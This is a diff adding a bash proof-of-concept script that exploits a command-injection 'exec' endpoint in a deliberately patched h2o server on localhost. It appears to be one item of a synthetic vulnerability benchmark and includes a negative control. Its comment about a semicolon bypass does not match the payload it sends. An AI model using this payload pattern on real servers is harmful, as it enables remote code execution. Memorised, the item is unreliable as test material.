@@ -1,0 +1,99 @@
+#!/usr/bin/env bash
+# PoC for 086_h2o_C2I2S2
+# Axes: C2 (two-flag struct gate) / I2 (snprintf buffer) / S2 (pipe blocked, bypass with ;)
+#
+# Usage: ./PoC.sh
+# Expected: prints uid= line confirming RCE as the server process user.
+#
+# The patched binary (h2o) lives in this directory. If absent, run:
+#   cd $(dirname $0) && bash build.sh
+
+set -euo pipefail
+
+SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+BINARY="$SAMPLE_DIR/h2o"
+WWWROOT="/tmp/poc_086_www"
+MARKER="/tmp/poc_086_marker"
+PORT=18086
+NEG_PORT=19086
+
+if [[ ! -x "$BINARY" ]]; then
+    echo "[-] binary not found at $BINARY — run build.sh first" >&2
+    exit 1
+fi
+
+SERVER_PID=0
+
+cleanup() {
+    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
+    rm -rf "$WWWROOT" "$MARKER" /tmp/poc_086_h2o.conf /tmp/poc_086_neg.conf
+}
+trap cleanup EXIT
+
+mkdir -p "$WWWROOT"
+
+# create h2o config
+CONF=/tmp/poc_086_h2o.conf
+cat > "$CONF" <<YAML
+listen:
+  host: 127.0.0.1
+  port: ${PORT}
+hosts:
+  "127.0.0.1:${PORT}":
+    paths:
+      /:
+        file.dir: ${WWWROOT}
+access-log: /dev/null
+error-log: /dev/null
+YAML
+
+# ── start server with both exec flags ─────────────────────────────────────────
+echo "[*] starting h2o with --exec-mode and --exec-verbose on port $PORT..."
+"$BINARY" -c "$CONF" --exec-mode --exec-verbose &
+SERVER_PID=$!
+sleep 0.6
+
+# ── trigger exploit: semicolon chains bypass pipe-block (S2) ─────────────────
+echo "[*] sending payload: cmd=id>${MARKER}"
+curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true
+
+# ── verify ─────────────────────────────────────────────────────────────────────
+if [[ -f "$MARKER" ]]; then
+    echo "[+] RCE confirmed. Server executed:"
+    cat "$MARKER"
+else
+    echo "[-] marker file not found — exploit failed"
+    exit 1
+fi
+
+# ── negative control: missing one flag means endpoint not registered ───────────
+echo "[*] verifying gate: endpoint absent without --exec-verbose..."
+kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
+SERVER_PID=0
+
+NEG_CONF=/tmp/poc_086_neg.conf
+cat > "$NEG_CONF" <<YAML
+listen:
+  host: 127.0.0.1
+  port: ${NEG_PORT}
+hosts:
+  "127.0.0.1:${NEG_PORT}":
+    paths:
+      /:
+        file.dir: ${WWWROOT}
+access-log: /dev/null
+error-log: /dev/null
+YAML
+
+"$BINARY" -c "$NEG_CONF" --exec-mode &
+SAFE_PID=$!
+sleep 0.6
+HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
+    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
+kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
+
+if [[ "$HTTP_CODE" == "404" ]]; then
+    echo "[+] gate check passed: got 404 with only --exec-mode (missing --exec-verbose)"
+else
+    echo "[!] gate check unexpected response: $HTTP_CODE"
+fi
